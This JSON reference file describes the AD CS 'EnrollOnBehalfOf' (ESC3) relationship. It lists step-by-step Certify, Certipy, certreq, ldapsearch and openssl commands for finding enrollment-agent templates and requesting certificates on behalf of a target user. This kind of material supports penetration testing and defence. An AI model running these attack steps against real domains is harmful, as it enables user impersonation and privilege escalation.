{
    "EnrollOnBehalfOf": {
        "meaning": "The certificate template 'A' is configured to be used as an enrollment agent. The certificate template 'B' is configured to allow enrollment by enrollment agents. Both certificate templates are published by an enterprise CA which is trusted for NT authentication and chain up to a root CA for the domain. This enables a principal with a certificate of certificate template 'A' to enroll on behalf of other principals for certificate template 'B' as long as enrollment agent restrictions configured on the enterprise CA permit it.",
        "common": "",
        "windows": {
            "ADCS_ESC3_Attack": [
                {
                    "order": 1,
                    "command": "Certify.exe find /vulnerable",
                    "description": "Identify vulnerable certificate templates and enrollment agent configurations"
                },
                {
                    "order": 2,
                    "command": "Certify.exe request /ca:ca.domain.com\\ca-name /template:EnrollmentAgentTemplate",
                    "description": "Request enrollment agent certificate using template A"
                },
                {
                    "order": 3,
                    "command": "Certify.exe request /ca:ca.domain.com\\ca-name /template:UserTemplate /onbehalfof:DOMAIN\\targetuser /enrollcert:agent.pfx /enrollcertpw:password",
                    "description": "Use enrollment agent certificate to request certificate on behalf of target user using template B"
                }
            ],
            "Certificate_Template_Analysis": [
                {
                    "order": 1,
                    "command": "Get-CATemplate | Where-Object {$_.EnrollmentAgentRequired -eq $true}",
                    "description": "Identify certificate templates that allow enrollment agent enrollment"
                },
                {
                    "order": 2,
                    "command": "Get-CATemplate | Where-Object {$_.ApplicationPolicies -contains '1.3.6.1.4.1.311.20.2.1'}",
                    "description": "Find templates configured as enrollment agent templates (Certificate Request Agent OID)"
                },
                {
                    "order": 3,
                    "command": "certutil -CATemplates",
                    "description": "List all available certificate templates and their configurations"
                }
            ],
            "Manual_Certificate_Request": [
                {
                    "order": 1,
                    "command": "certreq -new template-a.inf agent-request.req",
                    "description": "Create certificate request for enrollment agent template manually"
                },
                {
                    "order": 2,
                    "command": "certreq -submit -config ca.domain.com\\ca-name agent-request.req agent-cert.cer",
                    "description": "Submit enrollment agent certificate request to CA"
                },
                {
                    "order": 3,
                    "command": "certreq -accept agent-cert.cer",
                    "description": "Install enrollment agent certificate into certificate store"
                }
            ]
        },
        "linux": {
            "Certipy_ESC3": [
                {
                    "order": 1,
                    "command": "certipy find -u user@domain.com -p password -dc-ip dc.domain.com",
                    "description": "Discovery phase to identify enrollment agent templates and relationships"
                },
                {
                    "order": 2,
                    "command": "certipy req -u user@domain.com -p password -ca ca.domain.com\\ca-name -template EnrollmentAgentTemplate",
                    "description": "Request enrollment agent certificate using template A"
                },
                {
                    "order": 3,
                    "command": "certipy req -u user@domain.com -p password -ca ca.domain.com\\ca-name -template UserTemplate -on-behalf-of domain\\targetuser -pfx agent.pfx",
                    "description": "Use enrollment agent certificate to enroll on behalf of target user for template B"
                }
            ],
            "Manual_Template_Analysis": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' '(objectClass=pKICertificateTemplate)' name msPKI-Certificate-Application-Policy",
                    "description": "Query LDAP for certificate templates and their application policies"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' '(msPKI-Certificate-Application-Policy=1.3.6.1.4.1.311.20.2.1)' name",
                    "description": "Find enrollment agent templates by Certificate Request Agent OID"
                },
                {
                    "order": 3,
                    "command": "# Analyze template relationships to identify EnrollOnBehalfOf attack paths",
                    "description": "Map certificate template relationships for ESC3 attack vectors"
                }
            ],
            "OpenSSL_Certificate_Operations": [
                {
                    "order": 1,
                    "command": "openssl genrsa -out agent.key 2048",
                    "description": "Generate private key for enrollment agent certificate request"
                },
                {
                    "order": 2,
                    "command": "openssl req -new -key agent.key -out agent.csr -subj '/CN=EnrollmentAgent'",
                    "description": "Create certificate signing request for enrollment agent"
                },
                {
                    "order": 3,
                    "command": "# Submit CSR to ADCS web enrollment or via RPC for enrollment agent template",
                    "description": "Use web interface or API to request enrollment agent certificate"
                }
            ]
        }
    }
}
